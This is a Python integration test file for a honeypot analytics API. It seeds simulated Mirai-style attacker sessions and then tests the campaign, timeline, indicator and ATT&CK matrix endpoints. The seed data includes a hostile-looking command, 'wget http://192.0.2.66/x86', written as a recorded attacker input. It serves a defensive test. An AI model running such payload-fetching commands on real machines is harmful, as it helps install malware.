"""Campaign and ATT&CK endpoints against a real TimescaleDB with a hand-checked dataset."""

import os
from collections.abc import AsyncIterator
from datetime import UTC, date, datetime, timedelta
from typing import Any

import httpx
import pytest
from analytics_seed import Seed, api_engine, owner_engine
from sqlalchemy import text
from suckerpot_db import create_session_factory

from api.main import create_app

pytestmark = [
    pytest.mark.integration,
    pytest.mark.skipif(not os.environ.get("POSTGRES_HOST"), reason="POSTGRES_HOST not set"),
]

NOW = datetime.now(UTC).replace(microsecond=0)
TODAY = NOW.date()
SRC = [f"203.0.113.{i}" for i in range(1, 6)]
NL = ("NL", "Amsterdam", 14061, "DigitalOcean, LLC")
CATALOGUE = [
    ("T1082", "System Information Discovery", "discovery", "recon"),
    ("T1110", "Brute Force", "credential-access", "access"),
    ("T1059", "Command and Scripting Interpreter", "execution", "execution"),
    ("T1059.004", "Command and Scripting Interpreter: Unix Shell", "execution", "execution"),
    ("T1105", "Ingress Tool Transfer", "command-and-control", "tool_transfer"),
    ("T1496", "Resource Hijacking", "impact", "objective"),
]


async def seed() -> None:
    s = Seed()
    for n, ip in enumerate(SRC):
        s.session(
            f"s{n}",
            "telnet" if n < 3 else "ssh",
            ip,
            NOW - timedelta(hours=2, minutes=n * 10),
            [
                (0.0, "connect", {}),
                (1.0, "login_attempt", {"username": "root", "password": "x", "success": True}),
                (2.0, "command", {"input": "uname -a"}),
                (3.0, "command", {"input": "wget http://192.0.2.66/x86\x1b[31m"}),
                (4.0, "download_attempt", {"url": "http://192.0.2.66/x86"}),
            ],
            geo=NL,
            tags=["mirai"],
        )
    async with owner_engine() as owner:
        async with owner.begin() as conn:
            # CASCADE also empties sessions (they point at campaigns): write those afterwards.
            await conn.execute(
                text(
                    "TRUNCATE campaigns, campaign_keys, campaign_sessions, technique_daily, "
                    "attack_techniques CASCADE"
                )
            )
        await s.write(owner)
        async with owner.begin() as conn:
            for tid, name, tactic, stage in CATALOGUE:
                await conn.execute(
                    text("INSERT INTO attack_techniques VALUES (:i, :n, :t, :s, :u)"),
                    {
                        "i": tid,
                        "n": name,
                        "t": tactic,
                        "s": stage,
                        "u": f"https://attack.example/{tid}",
                    },
                )
            ids: dict[str, int] = {}
            for name, status, hours, techniques, tags, families, sev, sensors, n in [
                ("Mirai loader over Telnet #1", "active", 2, ["T1082", "T1059.004", "T1105"],
                 ["mirai"], ["mirai"], "severe", ["telnet", "ssh"], 5),
                ("Crypto-miner drop over SSH #2", "quiet", 24 * 20, ["T1110", "T1496"],
                 ["crypto-miner"], [], "severe", ["ssh"], 40),
                ("Old merged thing #3", "merged", 24 * 40, ["T1082"], [], [], "info", ["ssh"], 3),
            ]:  # fmt: skip
                row = await conn.execute(
                    text(
                        "INSERT INTO campaigns (name, status, first_seen, last_seen, sessions, "
                        "sources, countries, asns, sensors, techniques, stages, tags, families, "
                        "severity, rep_session_id) VALUES (:name, :status, :fs, :ls, :n, 4, "
                        "ARRAY['NL'], ARRAY[14061], :sensors, :t, :st, :tags, :fam, :sev, "
                        "'s0') RETURNING id"
                    ),
                    {
                        "name": name, "status": status, "fs": NOW - timedelta(hours=hours + 5),
                        "ls": NOW - timedelta(hours=hours), "n": n, "sensors": sensors,
                        "t": techniques, "st": ["recon", "access"], "tags": tags, "fam": families,
                        "sev": sev,
                    },
                )  # fmt: skip
                ids[name] = row.scalar_one()
            first = ids["Mirai loader over Telnet #1"]
            await conn.execute(
                text("UPDATE campaigns SET merged_into = :f WHERE status = 'merged'"), {"f": first}
            )
            await conn.execute(
                text("UPDATE sessions SET campaign_id = :c, techniques = ARRAY['T1082']"),
                {"c": first},
            )
            for i in range(5):
                await conn.execute(
                    text(
                        "INSERT INTO campaign_sessions VALUES (:c, :s, CAST(:ip AS inet), "
                        "'telnet', :ts)"
                    ),
                    {
                        "c": first,
                        "s": f"s{i}",
                        "ip": SRC[i],
                        "ts": NOW - timedelta(hours=2, minutes=i * 10),
                    },
                )
            for kind, value in [
                ("payload_host", "192.0.2.66"),
                ("family", "mirai"),
                ("script", "ab" * 32),
            ]:
                await conn.execute(
                    text("INSERT INTO campaign_keys VALUES (:k, :v, :c, 5, :fs, :ls)"),
                    {"k": kind, "v": value, "c": first, "fs": NOW - timedelta(hours=3), "ls": NOW},
                )
            for tid, day_ago, sensor, sessions in [
                ("T1082", 0, "telnet", 3), ("T1082", 1, "ssh", 2), ("T1105", 0, "telnet", 4),
                ("T1496", 3, "ssh", 7), ("T1110", 40, "ssh", 9),
            ]:  # fmt: skip
                await conn.execute(
                    text("INSERT INTO technique_daily VALUES (:d, :t, :s, :n, :e, 1)"),
                    {
                        "d": TODAY - timedelta(days=day_ago),
                        "t": tid,
                        "s": sensor,
                        "n": sessions,
                        "e": sessions * 3,
                    },
                )


@pytest.fixture
async def client() -> AsyncIterator[httpx.AsyncClient]:
    await seed()
    engine = api_engine()
    app = create_app(create_session_factory(engine), enable_live=False)
    async with app.router.lifespan_context(app):
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app), base_url="http://t/api/v1"
        ) as c:
            yield c
    await engine.dispose()


async def get(client: httpx.AsyncClient, path: str, **params: Any) -> Any:
    r = await client.get(path, params=params)
    assert r.status_code == 200, r.text
    return r.json()


async def test_list_hides_merged_orders_by_last_seen_and_pages(client: httpx.AsyncClient) -> None:
    page = await get(client, "/campaigns")
    assert [c["name"] for c in page["items"]] == [
        "Mirai loader over Telnet #1",
        "Crypto-miner drop over SSH #2",
    ]
    assert page["next_cursor"] is None
    first = await get(client, "/campaigns", limit=1)
    assert [c["id"] for c in first["items"]] == [page["items"][0]["id"]]
    assert first["next_cursor"]
    second = await get(client, "/campaigns", limit=1, cursor=first["next_cursor"])
    assert [c["id"] for c in second["items"]] == [page["items"][1]["id"]]
    assert second["next_cursor"] is None
    merged = await get(client, "/campaigns", status="merged")
    assert [c["name"] for c in merged["items"]] == ["Old merged thing #3"]
    assert merged["items"][0]["merged_into"] == page["items"][0]["id"]


async def test_filters(client: httpx.AsyncClient) -> None:
    async def names(**params: Any) -> list[str]:
        return [c["name"] for c in (await get(client, "/campaigns", **params))["items"]]

    assert await names(status="quiet") == ["Crypto-miner drop over SSH #2"]
    assert await names(sensor="telnet") == ["Mirai loader over Telnet #1"]
    assert len(await names(sensor="telnet,ssh")) == 2
    assert await names(technique="T1496") == ["Crypto-miner drop over SSH #2"]
    assert await names(family="MIRAI") == ["Mirai loader over Telnet #1"]
    assert await names(days=1) == ["Mirai loader over Telnet #1"]
    assert await names(hours=1) == []
    assert await names(q="crypto") == ["Crypto-miner drop over SSH #2"]
    assert await names(q="%") == []  # a literal search, not a pattern
    assert len(await names(include_benign="true")) == 2


async def test_validation(client: httpx.AsyncClient) -> None:
    for params in (
        {"limit": 0}, {"limit": 201}, {"technique": "T1"}, {"days": 0}, {"days": 366},
        {"status": "gone"}, {"sensor": "nope"}, {"q": "x" * 65},
    ):  # fmt: skip
        assert (await client.get("/campaigns", params=params)).status_code == 422, params
    assert (await client.get("/campaigns", params={"cursor": "!!"})).status_code == 400
    assert (await client.get("/campaigns/0")).status_code == 422
    assert (await client.get("/campaigns/999999")).status_code == 404
    assert (await client.get("/campaigns/abc")).status_code == 422


async def test_detail_story_timeline_sessions_and_indicators(client: httpx.AsyncClient) -> None:
    cid = (await get(client, "/campaigns"))["items"][0]["id"]
    detail = await get(client, f"/campaigns/{cid}")
    assert (detail["sessions"], detail["sources"], detail["severity"]) == (5, 4, "severe")

    story = await get(client, f"/campaigns/{cid}/story")
    assert [s["stage"] for s in story["stages"]] == ["recon", "execution", "tool_transfer"]
    execution = story["stages"][1]
    assert [t["id"] for t in execution["techniques"]] == ["T1059.004"]  # the parent is folded away
    assert execution["summary"] == "They typed shell commands."
    assert story["headline"] == (
        "5 sessions from 4 addresses followed the same playbook: "
        "looking around, running code, then bringing tools."
    )
    assert story["counts"]["countries"] == 1
    assert any("192[.]0[.]2[.]66" in tip for tip in story["what_to_do"])
    assert story["excerpt"]["session_id"] == "s0"
    kinds = [line["kind"] for line in story["excerpt"]["lines"]]
    assert kinds == ["login", "command", "command", "download"]
    # Terminal control characters from the attacker never reach the page.
    assert all("\x1b" not in line["text"] for line in story["excerpt"]["lines"])

    timeline = await get(client, f"/campaigns/{cid}/timeline", days=2)
    assert timeline["bucket_seconds"] == 3600
    assert timeline["linked"] == 5
    assert sum(p["sessions"] for p in timeline["points"]) == 5
    assert (await client.get(f"/campaigns/{cid}/timeline", params={"days": 31})).status_code == 422

    sessions = await get(client, f"/campaigns/{cid}/sessions", limit=2)
    assert len(sessions["items"]) == 2
    assert sessions["next_cursor"]
    rest = await get(client, f"/campaigns/{cid}/sessions", cursor=sessions["next_cursor"])
    assert len(rest["items"]) == 3
    assert sessions["items"][0]["campaign_id"] == cid
    assert sessions["items"][0]["techniques"] == ["T1082"]

    indicators = (await get(client, f"/campaigns/{cid}/indicators"))["items"]
    assert {i["confidence"] for i in indicators} == {"normal"}
    assert [(i["kind"], i["defanged"]) for i in indicators] == [
        ("family", "mirai"),
        ("payload_host", "192[.]0[.]2[.]66"),
        ("script", "ab" * 32),
    ]


async def test_session_filters_by_campaign_and_technique(client: httpx.AsyncClient) -> None:
    cid = (await get(client, "/campaigns"))["items"][0]["id"]
    assert len((await get(client, "/sessions", campaign_id=cid))["items"]) == 5
    assert len((await get(client, "/sessions", technique="T1082"))["items"]) == 5
    assert (await get(client, "/sessions", technique="T1496"))["items"] == []
    assert (await client.get("/sessions", params={"technique": "bad"})).status_code == 422


async def test_techniques_catalogue_with_counts(client: httpx.AsyncClient) -> None:
    page = await get(client, "/attack/techniques", days=30)
    by_id = {t["id"]: t for t in page["items"]}
    assert len(by_id) == len(CATALOGUE)
    assert (by_id["T1082"]["sessions"], by_id["T1082"]["events"]) == (5, 15)
    assert by_id["T1082"]["last_day"] == TODAY.isoformat()
    assert by_id["T1110"]["sessions"] == 0  # 40 days ago: outside the window
    assert by_id["T1059"]["sessions"] == 0  # in the catalogue, never seen
    assert by_id["T1496"]["plain"] == "used the machine to mine cryptocurrency"
    assert by_id["T1082"]["stage_label"] == "Looking around"
    wide = await get(client, "/attack/techniques", days=60)
    assert {t["id"]: t for t in wide["items"]}["T1110"]["sessions"] == 9
    paged = await get(client, "/attack/techniques", limit=2)
    assert len(paged["items"]) == 2
    assert paged["next_cursor"]
    nxt = await get(client, "/attack/techniques", limit=50, cursor=paged["next_cursor"])
    assert len(nxt["items"]) == len(CATALOGUE) - 2
    assert (await client.get("/attack/techniques", params={"days": 0})).status_code == 422
    assert (await client.get("/attack/techniques", params={"cursor": "!!"})).status_code == 400


async def test_matrix(client: httpx.AsyncClient) -> None:
    m = await get(client, "/attack/matrix", days=7)
    assert len(m["days"]) == 7
    assert m["until"] == TODAY.isoformat()
    assert date.fromisoformat(m["since"]) == TODAY - timedelta(days=6)
    assert [s["stage"] for s in m["stages"]][:2] == ["recon", "access"]
    rows = {r["id"]: r for r in m["rows"]}
    assert set(rows) == {"T1082", "T1105", "T1496"}  # only what was seen in the window
    assert rows["T1082"]["counts"] == [0, 0, 0, 0, 0, 2, 3]
    assert rows["T1082"]["total_sessions"] == 5
    assert rows["T1496"]["counts"][3] == 7
    assert [r["id"] for r in m["rows"]] == ["T1082", "T1105", "T1496"]  # story order
    ssh_only = await get(client, "/attack/matrix", days=7, sensor="ssh")
    assert {r["id"]: r["total_sessions"] for r in ssh_only["rows"]} == {"T1082": 2, "T1496": 7}
    assert (await client.get("/attack/matrix", params={"days": 366})).status_code == 422
